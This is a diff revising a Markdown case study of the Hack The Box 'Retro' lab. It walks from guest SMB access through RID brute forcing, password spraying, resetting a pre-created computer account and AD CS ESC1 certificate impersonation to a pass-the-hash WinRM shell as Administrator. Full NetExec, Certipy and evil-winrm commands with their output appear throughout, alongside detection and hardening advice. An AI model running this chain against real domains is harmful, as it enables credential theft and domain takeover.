@@ -1,5 +1,5 @@
 ---
-title: "Retro: AD CS ESC1 via Guest SMB Disclosure and Pre-created Computer Account"
+title: "Retro — AD CS ESC1 Impersonation via Guest SMB Disclosure and a Pre-created Computer Account"
 description: "Guest SMB notes and a pre-created computer account lead to an ESC1 certificate template and administrator impersonation."
 type: case-study
 platform: Hack The Box
@@ -10,21 +10,54 @@ tags:
   - windows
   - active-directory
   - ad-cs
+objective: "Escalate from unauthenticated guest SMB access to domain Administrator by chaining a disclosed shared credential, a pre-created computer account, and an AD CS ESC1 template."
+tools:
+  - rustscan
+  - nmap
+  - netexec
+  - certipy
+  - evil-winrm
+skill: "Active Directory exploitation via credential spray, pre-created computer accounts, and AD CS certificate abuse"
+outcome: "Domain Administrator: certificate-based impersonation of the Administrator account yields its NTLM hash and a WinRM session."
 ---
+
+## At a glance
+
+| Field | Value |
+|---|---|
+| Difficulty | Easy |
+| Target environment | Windows Active Directory domain controller |
+| Starting position | Unauthenticated network access |
+| Objective | Escalate from unauthenticated guest SMB access to domain Administrator by chaining a disclosed shared credential, a pre-created computer account, and an AD CS ESC1 template |
+| Outcome | Domain Administrator via AD CS ESC1 certificate impersonation |
 
 ## Summary
 
-Retro is a Windows Active Directory machine in a target domain. Guest-accessible SMB shares expose a trainee note disclosing weak shared credentials. RID brute forcing followed by username-as-password spraying yields valid domain credentials. A second note references a legacy pre-created computer account with a predictable password. After resetting that account's password, AD CS enumeration reveals an ESC1-vulnerable certificate template, enabling certificate-based impersonation of an administrator account and full domain compromise.
+Retro is an Easy-rated Hack The Box Windows Active Directory lab. Guest-accessible SMB shares expose a trainee note describing a shared weak-credential policy; RID brute forcing and username-as-password spraying yield a working domain credential, which unlocks a second share. That note points to a legacy pre-created computer account whose password is reset, producing an authenticated principal with certificate-services enrollment rights. Certificate-services enumeration finds an ESC1 template that accepts enrollee-supplied subject values, and a certificate for the Administrator identity yields its NTLM hash and an administrative WinRM session. Target addresses, domain and account names, and secret values are replaced with role-based placeholders; command syntax is preserved.
 
-> All target IPs, credentials, hashes, and SIDs in this article are sanitized placeholders.
+**Attack path:** **Guest SMB disclosure → RID brute force and username-as-password spray → pre-created computer account reset → AD CS ESC1 certificate request → Administrator NTLM hash via certificate authentication → WinRM administrative session**
 
 ## Context and Objective
 
-The engagement targeted a single Active Directory domain controller. Standard lab constraints applied: no production data, controlled scope, and the goal of achieving domain administrator access through identified misconfigurations.
+- **Target:** a single Windows Active Directory domain controller.
+- **Exposed services:** DNS (53), Kerberos (88), SMB (445), LDAPS (636), RDP (3389), and WinRM (5985).
+- **Starting position:** unauthenticated network access, with no provided credentials.
+- **Objective:** move from unauthenticated guest file access to domain administrative control by abusing shared credentials, a stale pre-created computer account, and a certificate-services misconfiguration.
+- **Constraints:** activity was confined to the Hack The Box lab environment.
 
-Key environmental observations from port scanning:
+## Approach and Evidence
 
+### 1. Service Enumeration
+
+Observation: a full scan of the domain controller exposes the standard Active Directory service set.
+
+```bash
+rustscan -a <TARGET_IP> --ulimit 5000 -- -Pn -sC -sV -oN <SCAN_OUTPUT>
 ```
+
+Truncated scan output:
+
+```text
 53/tcp   open  domain        Simple DNS Plus
 88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
 445/tcp  open  microsoft-ds
@@ -33,94 +66,131 @@ Key environmental observations from port scanning:
 5985/tcp open  WinRM
 ```
 
-## Approach and Evidence
+Significance: Kerberos, LDAP, SMB, and WinRM together confirm a domain controller, and WinRM on 5985 will become the remote administrative entry point if administrative credentials are recovered.
 
-### Stage 1: Guest SMB Share Enumeration
+Result: a Windows Active Directory domain controller is exposed, with SMB and WinRM as the relevant interfaces for the path ahead.
 
-Null-session SMB access revealed a `Trainees` share containing an advisory note. The note disclosed that trainee accounts share a common weak credential:
+### 2. Guest SMB Share Access
+
+Observation: SMB accepts a guest session and exposes a readable share for trainees.
 
 ```bash
-nxc smb <TARGET_IP> -u 'a' -p '' --shares
+nxc smb <TARGET_DOMAIN> -u 'a' -p '' --shares
 ```
 
-```
+```text
 Trainees READ
 ```
 
-Downloading share contents with NetExec's spider module retrieved `Important.txt`, which confirmed the shared-credential policy.
+The share contains `Important.txt`, which describes the account policy in place:
 
-**Significance:** Guest-readable notes disclosing password policy weaknesses are a common initial-access vector in lab environments. The note explicitly hinted at username-as-password reuse.
+```text
+Dear Trainees,
 
-### Stage 2: RID Brute Force and Password Spray
+I know that some of you seemed to struggle with remembering strong and unique passwords.
+So we decided to bundle every one of you up into one account.
+```
 
-RID enumeration via the SMB null session collected domain usernames. Username-as-password spraying against the collected list yielded one valid credential pair:
+Significance: an unauthenticated party can read internal notes through a guest-accessible share, and this note states that trainee accounts share a single weak credential — a direct hint that username-as-password reuse is likely.
+
+Result: guest-readable share content identifies a shared-credential policy to target.
+
+### 3. RID Brute Force and Credential Spray
+
+Observation: a guest session allows RID enumeration to collect domain usernames, which can then be tried as their own passwords.
 
 ```bash
-nxc smb <TARGET_IP> -u 'Guest' -p '' --rid-brute \
+nxc smb <TARGET_DOMAIN> -u 'Guest' -p '' --rid-brute \
   | grep -v Guest \
   | awk -F'\\\\' '{print $2}' \
   | awk '{print $1}' > users.list
 
-nxc smb <TARGET_IP> \
+nxc smb <TARGET_DOMAIN> \
   -u users.list \
   -p users.list \
   --continue-on-success \
   --no-brute
 ```
 
-```
+One credential pair authenticates:
+
+```text
 <TARGET_DOMAIN>\<TRAINEE_USER> : <TRAINEE_PASSWORD>
 ```
 
-**Significance:** The `trainee` account, once authenticated, provided access to a second SMB share (`Notes`) containing additional operational intelligence about the environment.
+Significance: the shared-credential policy means a single guess (username equals password) validates for one account, converting an unauthenticated enumeration into an authenticated domain session.
 
-### Stage 3: Pre-created Computer Account Discovery and Password Reset
+Result: a working credential pair for `<TRAINEE_USER>` is recovered.
 
-The trainee account's second share contained a note referencing a legacy pre-created computer account that needed cleanup. NetExec's `pre2k` module confirmed the account's existence:
+### 4. Pre-created Computer Account Discovery and Reset
+
+Observation: the trainee account can read a second share whose note references a legacy pre-created computer account that needs cleanup.
 
 ```bash
-nxc ldap <TARGET_IP> -u '<TRAINEE_USER>' -p '<TRAINEE_PASSWORD>' -M pre2k
+nxc smb <TARGET_DOMAIN> -u '<TRAINEE_USER>' -p '<TRAINEE_PASSWORD>' --shares
 ```
 
+```text
+Notes READ
 ```
+
+The note names the account in passing:
+
+```text
+<LAB_ENGINEER>,
+
+after convincing the finance department to get rid of their ancient banking software
+it is finally time to clean up the mess they made. We should start with the pre created
+computer account.
+```
+
+NetExec's pre-created computer account module confirms the account exists:
+
+```bash
+nxc ldap <TARGET_DOMAIN> -u '<TRAINEE_USER>' -p '<TRAINEE_PASSWORD>' -M pre2k
+```
+
+```text
 Pre-created computer account: <PRECREATED_COMPUTER_ACCOUNT>
 ```
 
-Attempting authentication with the default pre-Windows 2000 computer password returned `STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT`, indicating a password reset was required:
+Authentication with the predictable pre-Windows 2000 password is rejected pending a password change:
 
 ```bash
-nxc smb <TARGET_IP> -u '<PRECREATED_COMPUTER_ACCOUNT>' -p '<DEFAULT_COMPUTER_PASSWORD>'
+nxc smb <TARGET_DOMAIN> -u '<PRECREATED_COMPUTER_ACCOUNT>' -p '<DEFAULT_COMPUTER_PASSWORD>'
 ```
 
-```
+```text
 STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT
 ```
 
-The password was reset using NetExec's `change-password` module:
+The password is reset with NetExec's `change-password` module:
 
 ```bash
-nxc smb <TARGET_IP> \
+nxc smb <TARGET_DOMAIN> \
   -u '<PRECREATED_COMPUTER_ACCOUNT>' \
   -p '<DEFAULT_COMPUTER_PASSWORD>' \
   -M change-password \
-  -o NEWPASS='<BANKING_PASSWORD>'
+  -o NEWPASS='<COMPUTER_PASSWORD>'
 ```
 
-Subsequent authentication succeeded:
+Subsequent authentication with the new password succeeds:
 
 ```bash
-nxc smb <TARGET_IP> -u '<PRECREATED_COMPUTER_ACCOUNT>' -p '<COMPUTER_PASSWORD>'
+nxc smb <TARGET_DOMAIN> -u '<PRECREATED_COMPUTER_ACCOUNT>' -p '<COMPUTER_PASSWORD>'
 ```
 
-```
+```text
 [+] <TARGET_DOMAIN>\<PRECREATED_COMPUTER_ACCOUNT>:<COMPUTER_PASSWORD>
 ```
 
-**Significance:** Pre-created computer accounts often retain predictable default passwords and may be overlooked during credential rotation. This account's group membership or permissions provided the necessary context for AD CS enumeration.
+Significance: a pre-created computer account kept its predictable default password and only needed one reset to become usable; `STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT` is the standard signal that the account is enabled but must change its password before it can authenticate.
 
-### Stage 4: AD CS ESC1 Exploitation
+Result: control of the pre-created computer account is established, giving an authenticated domain principal with certificate-services enrollment rights.
 
-Certificate services enumeration with Certipy revealed a vulnerable certificate template permitting enrollee-supplied subject values with client authentication (ESC1):
+### 5. AD CS ESC1 Template Discovery
+
+Observation: certificate-services enumeration looks for vulnerable templates from the computer account's context.
 
 ```bash
 certipy-ad find \
@@ -130,13 +200,21 @@ certipy-ad find \
   -dc-ip <TARGET_IP>
 ```
 
-```
+The template allows enrollee-supplied subject values with client authentication:
+
+```text
 Template Name : <VULNERABLE_CERTIFICATE_TEMPLATE>
 CA Name       : <CERTIFICATE_AUTHORITY>
 Vulnerability : ESC1 - Enrollee supplies subject and template allows client authentication
 ```
 
-A certificate was requested for the Administrator account, specifying the Administrator SID and a 4096-bit key:
+Significance: an ESC1 template lets any principal with enrollment rights request a certificate for an arbitrary subject identity, so a low-privileged enrollment right can be turned into impersonation of a higher-privileged account.
+
+Result: an ESC1-vulnerable template and its issuing certificate authority are identified.
+
+### 6. Certificate Impersonation and Administrator Hash Recovery
+
+Observation: the vulnerable template accepts an explicit subject identity, so a certificate can be requested for the Administrator account.
 
 ```bash
 certipy-ad req \
@@ -150,11 +228,11 @@ certipy-ad req \
   -key-size 4096
 ```
 
-```
+```text
 [*] Wrote certificate and private key to 'administrator.pfx'
 ```
 
-The certificate was used to authenticate and retrieve the Administrator NTLM hash:
+The certificate is used to authenticate to the domain and recover the Administrator NTLM hash:
 
 ```bash
 certipy-ad auth \
@@ -163,45 +241,57 @@ certipy-ad auth \
   -dc-ip <TARGET_IP>
 ```
 
-```
+```text
 Got hash for '<ADMINISTRATOR_ACCOUNT>@<TARGET_DOMAIN>':
-aad3b435b51404eeaad3b435b51404ee:<ADMIN_NTLM_HASH>
+<LM_HASH>:<ADMIN_NTLM_HASH>
 ```
 
-### Stage 5: Administrator Access via WinRM
+Significance: the issued certificate asserts the Administrator identity, so certificate-based authentication returns that account's NTLM hash without ever knowing its password.
 
-The Administrator NTLM hash was used for Pass-the-Hash authentication over WinRM:
+Result: the Administrator NTLM hash is recovered through certificate authentication.
+
+### 7. Administrator Access via WinRM
+
+Observation: the recovered Administrator hash can be used for Pass-the-Hash authentication against WinRM.
 
 ```bash
 evil-winrm -i <TARGET_IP> -u '<ADMINISTRATOR_ACCOUNT>' -H '<ADMIN_NTLM_HASH>'
 ```
 
-```
+```text
 *Evil-WinRM* PS C:\Users\Administrator\Desktop>
 ```
 
-Root flag was available from the Administrator desktop.
+Significance: WinRM accepts the hash directly, so the recovered credential material becomes an interactive administrative shell over the network.
 
-**Significance:** ESC1 allows any principal with enrollment rights on a vulnerable template to request a certificate for any user, achieving impersonation without knowing that user's password. The chain from guest access to full domain compromise exploited three distinct misconfigurations in sequence.
+Result: an administrative shell on the domain controller is obtained.
 
 ## Challenges and Decisions
 
-- The pre-created computer account required a password reset before normal authentication (`STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT`). The `change-password` module resolved this without additional tooling.
-- The certificate request required the Administrator SID and a 4096-bit key, which were obtained through enumeration rather than guessing.
+| Challenge | Decision | Rationale |
+|---|---|---|
+| The pre-created computer account rejected normal authentication with `STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT` | Reset the account password with NetExec's `change-password` module | The account had to change its password before it would authenticate, and the existing default password was sufficient to perform the reset |
+| The certificate request required the Administrator SID and a 4096-bit key | Supplied both explicitly in the request | The source records that this environment required the Administrator SID and a 4096-bit key |
 
 ## Outcome
 
-The evidence establishes a complete chain from unauthenticated guest SMB access to domain Administrator: guest share disclosure → credential spray → pre-created computer account → AD CS ESC1 → Administrator NT hash → WinRM shell. Each stage was confirmed by recorded command output.
+The evidence establishes administrative control of the domain through a certificate that impersonates the Administrator identity, yielding that account's NTLM hash and an interactive WinRM session. No software vulnerability was exploited: the path rests on misconfigured authentication and credential governance rather than a patchable defect.
 
 ## Lessons and Recommendations
 
-- Guest-readable shares disclosing password policy weaknesses should be treated as high-priority findings, as they directly enable credential-based attacks.
-- Pre-created computer accounts with predictable passwords are a common oversight in AD environments; periodic audit and removal of unused accounts is recommended.
-- AD CS templates permitting enrollee-supplied subject with client authentication (ESC1) enable impersonation of any domain principal; templates should be audited and hardened by requiring CA-manager approval or restricting subject supply.
-- Username-as-password spraying, while noisy, remains effective against environments with weak credential policies; detection rules for spray patterns should be deployed.
+Each finding pairs the observed root cause with its demonstrated impact and a prioritized action. The actions are recommendations; none was validated in the lab.
+
+1. **Guest-readable shares and shared weak credentials.** A guest session could read internal notes, and one note disclosed that trainee accounts shared a single password, which made the username-as-password spray succeed. *Recommendation:* require authentication on file shares, keep operational or credential-related guidance out of guest-readable locations, and enforce unique, strong passwords per account. *Detection:* alert on anonymous or guest SMB sessions and on authentication sprays that try one password across many accounts.
+2. **Stale pre-created computer account with a predictable password.** A pre-created computer account retained its default password and was still enabled, so a single password reset produced an authenticated principal. *Recommendation:* inventory pre-created and unused computer accounts, disable or delete the ones no longer needed, and rotate any account still using a default password. *Detection:* monitor computer-account password changes and authentication attempts using default machine-account passwords.
+3. **ESC1 certificate template.** A template permitted enrollee-supplied subject values with client authentication, allowing a certificate to be issued for the Administrator identity. *Recommendation:* audit certificate templates, remove the "enrollee supplies subject" setting, and require CA manager approval or scope enrollment so low-privileged principals cannot request arbitrary identities. *Validation:* periodically enumerate certificate-services misconfigurations with a tool such as Certipy and review the results.
 
 ## References
 
-- Hack The Box — [Retro](https://app.hackthebox.com/machines/Retro) machine
-- Certipy documentation: AD CS abuse tooling
-- NetExec documentation: SMB/LDAP enumeration modules
+- [Hack The Box — Retro](https://app.hackthebox.com/machines/Retro) (retired machine)
+- [SpecterOps — Certified Pre-Owned (AD CS abuse, including ESC1)](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
+- [Microsoft Learn — Certificate template concepts in Windows Server](https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/certificate-template-concepts)
+- [NetExec](https://github.com/Pennyw0rth/NetExec) (SMB, LDAP, and pre-created computer account modules)
+- [Certipy](https://github.com/ly4k/Certipy) (AD CS enumeration and certificate abuse)
+- [evil-winrm](https://github.com/Hackplayers/evil-winrm) (WinRM shell with hash authentication)
+- [RustScan](https://github.com/RustScan/RustScan) (fast port scanner)
+- [Nmap Reference Guide](https://nmap.org/book/man.html)
